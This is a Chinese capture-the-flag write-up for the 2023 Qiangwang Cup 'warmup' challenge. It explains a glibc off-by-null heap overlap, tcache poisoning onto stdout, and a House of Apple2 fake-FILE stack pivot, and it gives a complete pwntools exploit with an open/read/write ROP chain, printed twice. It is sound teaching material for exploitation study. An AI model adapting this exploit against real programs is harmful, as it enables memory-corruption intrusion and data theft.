# 2023强网杯warmup题解

> 原文: https://www.ctfiot.com/165317.html
> ID: 165317

一

前言

该题为强网杯中的题目warmup，对于该题主要考察了一个高版本下面的off by null利用，以及house of apple2的一个利用，上一篇博客正好讲了house of apple1，这里用强网杯warmup来介绍以下house of apple2的一些利用技巧和对应exp的详细讲解。

二

前置知识

对于这个题目利用了house of apple2的利用链和高版本的一个off by null的一个利用，首先利用off by null实现一个chunk overlap，之后通过overlap来修改tcache fd指针，使得其指向stdout，之后进行malloc就可以获得对应区域的chunk，之后伪造这里利用House of apple2的利用链来实现栈迁移到对应的rop链中，这样就可以实现orw了。

由于高版本（glibc2.29+）增加了size vs prevsize和bck->fd==P,fwd->bck==P这两个check，所以并不能像以前一样直接修改prev size和size的最低位就可以实现chunk overlap了，因此为了绕过对应的限制，需要进一步的进行处理，这部分会在之后讲解exp的地方详细说明如何进行构造。

相比于之前利用的house of apple1，house of apple2可以直接执行rop链，并不需要和比如House of emma进行结合，所以利用起来更加的方便，构造起来也更加少的代码，这个题我们利用了House of apple2加上栈迁移的思路，如果为了方便的话其实可以直接利用pwncli中的IO_FILE_plus_struct().house_of_apple2_stack_pivoting_when_exit就可以完成构造，但是为了讲述其实现攻击的原理，所以这里并不准备利用现成的api，还是通过自己构造来讲解原理。

三

warmup的脚本分析

对于这个题题目的功能也十分简单，分为add，delete，show三个函数：

首先分析以下add函数，这里可以看到本题对于size的大小限制并不严格，并且在*(*(&list + i) + read(0, *(&list + i), num)) = 0;这里存在了一个off by null的一个漏洞。

之后就是delete函数，这里再删除之后进行了置空操作，所以没有uaf漏洞。

最后就是show函数，打印出对应的内容。

通过上述对于漏洞的分析我们可以知道，这个题很明确的告诉我们要要通过off by null来实现chunk overlap，但是由于libc增加了新的机制，如何绕过才是关键，这里其实利用了一个很标准的模板，对应exp如下：

add(0x410) # 0
add(0xe0) # 1
add(0x430) # 2
add(0x430) # 3
add(0x100) # 4
add(0x480) # 5
add(0x420) # 6
add(0x10)#7

delete(0)
delete(3)
delete(6)

delete(2)

首先就是分配了7个chunk，这里面chunk 1和chunk4是barrier，我们首先删除0，3，6这三个chunk，之后再删除chunk 2，这样就可以让chunk2和chunk3进行合并，这里说明一下这里的add函数会默认输入b”deadbeef”八个字节的比特流。

之后就是add一个比free掉的chunk0和chunk6都打的一个chunk块，这里是0x450大小，这部分的主要作用就是修改之前的留下的size，将其修改位0x551，以及保存之前unsorted bin中的fd和bk指针，让fd指向被free掉的chunk0，bk指向被free掉的chunk6，这里其实目的就是绕过对应的bck->fd==P,fwd->bck==P的第一步，之后就是把余下的chunk都申请回来，使得没有被free掉的chunk再bin中。

add(0x450, flat({0x438: p16(0x551)})) # 0

add(0x410) # 2
add(0x420) # 3
add(0x410) # 6

之后就是把刚刚分配回来的2和6这两个chunk free之后在申请回来，这里的作用其实是修改最开始被free的chunk0的bk指向最开始的chunk3，原理在于，档删除这两个chunk的时候最开始的chunk0的bk指针就会指向现在的chunk2这里，这里距离之前的chunk3的距离其实就是差了0x20，最开始chunk 3 的位置为0x55678e194c00。

所以当我们在申请回来这两个的时候，由于我们add的时候默认输入八位的字符串，所以会讲这个Bk指针的第一位覆盖为0，正好bk指向最开始的chunk 3，这样又完成了伪造指针的一步。

delete(6)
delete(2)
add(0x410) # 2
add(0x410) # 6

之后就是让之前的chunk6的fd指向之前的chunk3，这里首先删除了6,3,5，对应最开始6是最开始的chunk 3剩下的一部分，3是最开始的chunk 6，5为之前的chunk 5，通过删除这三个可以使得3和5进行合并，效果如下：

之后就是修改最开始6chunk的fd指针，并且不能修改之前的chunk size，之后通过off by null使得指向现在chunk 6的指针指向了最开始的chunk 3，自此就完成了对于指针的伪造过程。

delete(6)
delete(3)
delete(5)

add(0x4f0, b"a"*0x488 + p64(0x431)) # 3
add(0x3b0) # 5

对于这部分指针的伪造，过程比较的绕，需要自己debug去调试一下，之后完成了bck->fd==P,fwd->bck==P这个的检查，我们只需要修改prev size字段，并且通过off by null覆盖低一位的chunk size的prev in use字段就可以了，这里还需要add(0x10)要么会因为chunk size不匹配的问题导致pwndbg显示不正确的问题，最终的效果如下，这里可以看到已经出现了chunk overlap。

add(0x108, b"a"*0x100 + p64(0x550))#4
add(0x410)#6
delete(3)
add(0x10)#3

再利用之前首先需要泄露堆地址和libc的基地址，由于已经有了chunk overlap，这部分也很轻松的就可以进行泄露，并且分配三个chunk。

show(6)
io.recv(6)
libc_base = u64(io.recv(6).ljust(8, b'x00')) - 0x219ce0

add(0x3f0)#8
add(0x60, b'a' * 0x18 + p64(0x91))#9
add(0x3f0)#10
delete(6)

show(8)
io.recv(6)
heap_addr = (u64(io.recv(5).ljust(8, b'x00')) << 12) + 0xc30

之后为了进行house of apple的攻击，我们需要先修改之前已经删除的tcache的fd字段，让他指向stdout，这样就可以malloc出来这段区域并且进行写，删除4和10两个Chunk之后的结构如下，并且bins中还有一个由于overlap没显示的0x90大小的Chunk，这个就是4对应的chunk。

之后我们通过add对其进行写，主要的目的就是编辑下方的tcache的fd指针，让他指向stdout，修改完成之后的效果如下：

delete(4)
delete(10)
add(0x80, b'a' * 0x48 + p64(0x401) + p64(((heap_addr + 0x470) >> 12) ^ (stdout_addr))[:-1])

自此就已经完成了前期的构造，之后我们只需要malloc两个0x400大小的chunk就可以写stdout上面的内容了，所以接下来的问题在于如何构造fake file，具体代码如下：

file1 = IO_FILE_plus_struct()
file1.flags = 0
file1._IO_read_ptr = pop_rbp
file1._IO_read_end = heap_addr + 0x470 - 8
file1._IO_read_base = leave_ret
file1._IO_write_base = 0
file1._IO_write_ptr = 1
file1._lock = heap_addr - 0xc30
file1.chain = leave_ret
file1._codecvt = stdout_addr
file1._wide_data = stdout_addr - 0x48
file1.vtable = libc.sym['_IO_wfile_jumps'] + libc_base - 0x20

这里详细讲一下为什么这么构造，这和house_of_apple2_stack_pivoting_when_exit的实现一样，首先我们先看一下roderick01大佬总结的House of apple中_IO_wfile_overflow的利用条件，这里直接借用下来，通过这里我们可以发现，如果成功利用这个链的话我们需要控制*(B + 0x68) = C这里，但是由于这个题不能直接进行getshell，所以如果是进行orw的话，我们只能利用栈迁移，将rsp迁移到我们可以构造的堆中，这样就可以进行读取flag了。

_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
_wide_data->_IO_write_base设置为0，即满足*(A + 0x18) = 0
_wide_data->_IO_buf_base设置为0，即满足*(A + 0x30) = 0
_wide_data->_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
_wide_data->_wide_vtable->doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C

所以首先我们要满足这个利用的要求，把flags设置为0，然后把_wide_data设置为可控的区域，这里指向的就是stdout – 0x48这里，这里需要注意的是，因为stdout上面是stderr，所以(stdout – 0x48 + 0x18)和(stdout – 0x48 + 0x30)都是0所以才可以指向这里的。

由于这两个地方已经是0了所以也不需要进一步的构造，之后就是把_wide_vtable设置为_IO_wfile_jumps – 0x20，这里需要讲一下为什么要-0x20，在大佬的文章中的例子是直接写入_IO_wfile_jumps，之后由于有main函数返回然后触发ffulsh之后触发_IO_wfile_overflow（0x20）的偏移最终orw的，但是对于这个题，我们可以在他puts的时候他正常会调用stdout的_IO_XSPUTN（0x40），所以他会找到对应虚表中偏移为0x40的指针去调用，所以我们在-x020之后，他就会把这个指针指向了_IO_wfile_overflow，这样就可以直接进行house of apple2的攻击了。

之后就是将_wide_vtable设置为可控的区域，这里就是0xe0 – 0x48也就是0x98，这里指向的就是_codecvt字段，所以我们把这个字段的值覆盖为stdout也就是这里的起始，最终执行的指针为0x68偏移，也就是chain指向的部分，这里我们写的是leave_ret，这是因为此时的rbp指向的就是stdout的结构体，因此通过leave ret就可以使得rsp迁移到stdout + 8这里。

所以我们在stdout + 8的地方再次进行栈迁移，首先是pop_rbp，之后填写需要迁移的地址，之后再leave ret就可以实现执行rop链了。

最后就是进行申请两个chunk之后将写rop链和fake file的内容填入，就可以实现整个攻击流程。

flag_addr = heap_addr + 0x470 + 0x100
payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscallret) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdxr12) + p64(0x50) + p64(0) + p64(read) + p64(pop_rdi) + p64(1) + p64(write)
payload = payload.ljust(0x100, b'x00')
payload += b'./flagx00'
add(0x3f0, payload)
add(0x3f0, bytes(file1))

最后的攻击效果如下，也是成功输出的flag success。

from pwn import *
from pwncli import *
io = process("./warmup")
libc = ELF("./libc.so.6")
context.arch = 'amd64'
def add(size, content = b"deadbeef"):
 io.recvuntil(b'>> ')
 io.sendline(b'1')
 io.recvuntil(b'Size: ')
 io.sendline(str(size).encode())
 io.recvuntil(b'Note: ')
 io.send(content)

def show(idx):
 io.recvuntil(b'>> ')
 io.sendline(b'2')
 io.recvuntil(b'Index: ')
 io.sendline(str(idx).encode())

def delete(idx):
 io.recvuntil(b'>> ')
 io.sendline(b'3')
 io.recvuntil(b'Index: ')
 io.sendline(str(idx).encode())

add(0x410) # 0
add(0xe0) # 1
add(0x430) # 2
add(0x430) # 3
add(0x100) # 4
add(0x480) # 5
add(0x420) # 6
add(0x10)#7

delete(0)
delete(3)
delete(6)

delete(2)

add(0x450, flat({0x438: p16(0x551)})) # 0

add(0x410) # 2
add(0x420) # 3
add(0x410) # 6

delete(6)
delete(2)
add(0x410) # 2
add(0x410) # 6

delete(6)
delete(3)
delete(5)

add(0x4f0, b"a"*0x488 + p64(0x431)) # 3
add(0x3b0) # 5

delete(4)

add(0x108, b"a"*0x100 + p64(0x550))#4

add(0x410)#6

delete(3)

add(0x10)#3
show(6)
io.recv(6)
libc_base = u64(io.recv(6).ljust(8, b'x00')) - 0x219ce0

add(0x3f0)#8
add(0x60, b'a' * 0x18 + p64(0x91))#9
add(0x3f0)#10
delete(6)

show(8)
io.recv(6)
heap_addr = (u64(io.recv(5).ljust(8, b'x00')) << 12) + 0xc30
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdxr12 = libc_base + 0x000000000011f0f7
ret = libc_base + 0x0000000000029cd6
pop_rax = libc_base + 0x0000000000045eb0
pop_rbp = libc_base + 0x000000000002a2e0
leave_ret = libc_base + 0x000000000004da83
close = libc_base + libc.sym['close']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
syscallret = libc_base + next(libc.search(asm('syscallnret')))
stdout_addr = libc.sym['_IO_2_1_stdout_'] + libc_base
delete(4)
delete(10)
add(0x80, b'a' * 0x48 + p64(0x401) + p64(((heap_addr + 0x470) >> 12) ^ (stdout_addr))[:-1])
file1 = IO_FILE_plus_struct()
file1.flags = 0
file1._IO_read_ptr = pop_rbp
file1._IO_read_end = heap_addr + 0x470 - 8
file1._IO_read_base = leave_ret
file1._IO_write_base = 0
file1._IO_write_ptr = 1
file1._lock = heap_addr - 0xc30
file1.chain = leave_ret
file1._codecvt = stdout_addr
file1._wide_data = stdout_addr - 0x48
file1.vtable = libc.sym['_IO_wfile_jumps'] + libc_base - 0x20

flag_addr = heap_addr + 0x470 + 0x100
payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscallret) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdxr12) + p64(0x50) + p64(0) + p64(read) + p64(pop_rdi) + p64(1) + p64(write)
payload = payload.ljust(0x100, b'x00')
payload += b'./flagx00'
add(0x3f0, payload)
add(0x3f0, bytes(file1))
io.interactive()

四

攻击流程复现

由于这个是利用了house of apple2这个链，所以我们首先再_IO_wfile_overflow这里下一个断点。

这里可以看见已经执行到这个函数了，之后就是找到call _IO_wdoallocbuf这里。

进入到该函数并且执行到call qword ptr [rax + 0x68]这里，这里就会执行我们之前构造好的leave ret的gadget。

之后通过栈迁移的代码，我们就可以指向到我们构造的rop链中，这里也就是利用syscall来执行open函数。

之后的步骤和之前一样，进行orw的调用，这里就不过多进行截图了。

五

总结

这个题目由于漏洞产生的地方比较明显，所以属于一个模板题，对于其中house of apple部分的构造也有现成的模板，这里主要是由于正好在学习House of apple的第二条利用链，所以也是对这个api进行拆分讲解，通过这个题目，学习到了高版本下如何进行off by null的利用，以及house of apple第二条链的利用。

看雪ID：a2ure

https://bbs.kanxue.com/user-home-991890.htm

*本文为看雪论坛优秀文章，由 a2ure 原创，转载请注明来自看雪社区

# 往期推荐

1、区块链智能合约逆向-合约创建-调用执行流程分析

2、在Windows平台使用VS2022的MSVC编译LLVM16

3、神挡杀神——揭开世界第一手游保护nProtect的神秘面纱

4、为什么在ASLR机制下DLL文件在不同进程中加载的基址相同

5、2022QWB final RDP

6、华为杯研究生国赛 adv_lua

球分享

球点赞

球在看

点击阅读原文查看更多


```
一
前言
二
前置知识
三
warmup的脚本分析
add(0x410) # 0
add(0xe0) # 1
add(0x430) # 2
add(0x430) # 3
add(0x100) # 4
add(0x480) # 5
add(0x420) # 6
add(0x10)#7

delete(0)
delete(3)
delete(6)

delete(2)
add(0x450, flat({0x438: p16(0x551)})) # 0

add(0x410) # 2
add(0x420) # 3
add(0x410) # 6
delete(6)
delete(2)
add(0x410) # 2
add(0x410) # 6
delete(6)
delete(3)
delete(5)

add(0x4f0, b"a"*0x488 + p64(0x431)) # 3
add(0x3b0) # 5
add(0x108, b"a"*0x100 + p64(0x550))#4
add(0x410)#6
delete(3)
add(0x10)#3
show(6)
io.recv(6)
libc_base = u64(io.recv(6).ljust(8, b'x00')) - 0x219ce0

add(0x3f0)#8
add(0x60, b'a' * 0x18 + p64(0x91))#9
add(0x3f0)#10
delete(6)

show(8)
io.recv(6)
heap_addr = (u64(io.recv(5).ljust(8, b'x00')) << 12) + 0xc30
delete(4)
delete(10)
add(0x80, b'a' * 0x48 + p64(0x401) + p64(((heap_addr + 0x470) >> 12) ^ (stdout_addr))[:-1])
file1 = IO_FILE_plus_struct()
file1.flags = 0
file1._IO_read_ptr = pop_rbp
file1._IO_read_end = heap_addr + 0x470 - 8
file1._IO_read_base = leave_ret
file1._IO_write_base = 0
file1._IO_write_ptr = 1
file1._lock = heap_addr - 0xc30
file1.chain = leave_ret
file1._codecvt = stdout_addr
file1._wide_data = stdout_addr - 0x48
file1.vtable = libc.sym['_IO_wfile_jumps'] + libc_base - 0x20
_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
_wide_data->_IO_write_base设置为0，即满足*(A + 0x18) = 0
_wide_data->_IO_buf_base设置为0，即满足*(A + 0x30) = 0
_wide_data->_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
_wide_data->_wide_vtable->doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
flag_addr = heap_addr + 0x470 + 0x100
payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscallret) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdxr12) + p64(0x50) + p64(0) + p64(read) + p64(pop_rdi) + p64(1) + p64(write)
payload = payload.ljust(0x100, b'x00')
payload += b'./flagx00'
add(0x3f0, payload)
add(0x3f0, bytes(file1))
from pwn import *
from pwncli import *
io = process("./warmup")
libc = ELF("./libc.so.6")
context.arch = 'amd64'
def add(size, content = b"deadbeef"):
 io.recvuntil(b'>> ')
 io.sendline(b'1')
 io.recvuntil(b'Size: ')
 io.sendline(str(size).encode())
 io.recvuntil(b'Note: ')
 io.send(content)

def show(idx):
 io.recvuntil(b'>> ')
 io.sendline(b'2')
 io.recvuntil(b'Index: ')
 io.sendline(str(idx).encode())

def delete(idx):
 io.recvuntil(b'>> ')
 io.sendline(b'3')
 io.recvuntil(b'Index: ')
 io.sendline(str(idx).encode())

add(0x410) # 0
add(0xe0) # 1
add(0x430) # 2
add(0x430) # 3
add(0x100) # 4
add(0x480) # 5
add(0x420) # 6
add(0x10)#7

delete(0)
delete(3)
delete(6)

delete(2)

add(0x450, flat({0x438: p16(0x551)})) # 0

add(0x410) # 2
add(0x420) # 3
add(0x410) # 6

delete(6)
delete(2)
add(0x410) # 2
add(0x410) # 6

delete(6)
delete(3)
delete(5)

add(0x4f0, b"a"*0x488 + p64(0x431)) # 3
add(0x3b0) # 5

delete(4)

add(0x108, b"a"*0x100 + p64(0x550))#4

add(0x410)#6

delete(3)

add(0x10)#3
show(6)
io.recv(6)
libc_base = u64(io.recv(6).ljust(8, b'x00')) - 0x219ce0

add(0x3f0)#8
add(0x60, b'a' * 0x18 + p64(0x91))#9
add(0x3f0)#10
delete(6)

show(8)
io.recv(6)
heap_addr = (u64(io.recv(5).ljust(8, b'x00')) << 12) + 0xc30
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdxr12 = libc_base + 0x000000000011f0f7
ret = libc_base + 0x0000000000029cd6
pop_rax = libc_base + 0x0000000000045eb0
pop_rbp = libc_base + 0x000000000002a2e0
leave_ret = libc_base + 0x000000000004da83
close = libc_base + libc.sym['close']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
syscallret = libc_base + next(libc.search(asm('syscallnret')))
stdout_addr = libc.sym['_IO_2_1_stdout_'] + libc_base
delete(4)
delete(10)
add(0x80, b'a' * 0x48 + p64(0x401) + p64(((heap_addr + 0x470) >> 12) ^ (stdout_addr))[:-1])
file1 = IO_FILE_plus_struct()
file1.flags = 0
file1._IO_read_ptr = pop_rbp
file1._IO_read_end = heap_addr + 0x470 - 8
file1._IO_read_base = leave_ret
file1._IO_write_base = 0
file1._IO_write_ptr = 1
file1._lock = heap_addr - 0xc30
file1.chain = leave_ret
file1._codecvt = stdout_addr
file1._wide_data = stdout_addr - 0x48
file1.vtable = libc.sym['_IO_wfile_jumps'] + libc_base - 0x20

flag_addr = heap_addr + 0x470 + 0x100
payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscallret) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdxr12) + p64(0x50) + p64(0) + p64(read) + p64(pop_rdi) + p64(1) + p64(write)
payload = payload.ljust(0x100, b'x00')
payload += b'./flagx00'
add(0x3f0, payload)
add(0x3f0, bytes(file1))
io.interactive()
四
攻击流程复现
五
总结
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/2-1709292443.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/7-1709292444.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/4-1709292445.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/1-1709292446.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/9-1709292447.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/9-1709292448.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/0-1709292449.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/3-1709292450.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/8-1709292451.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/4-1709292452.png)